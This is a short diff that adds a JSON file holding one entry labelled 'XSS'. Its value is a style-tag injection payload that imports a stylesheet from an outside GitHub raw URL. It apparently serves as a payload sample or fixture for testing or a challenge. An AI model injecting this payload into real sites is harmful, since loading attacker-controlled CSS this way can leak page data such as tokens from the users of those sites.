@@ -1,0 +1,3 @@
+{
+  "XSS": "<style>@import url(https://raw.githubusercontent.com/HongJiWook/ex01/master/a.json/staging?len=32);</style>"
+}
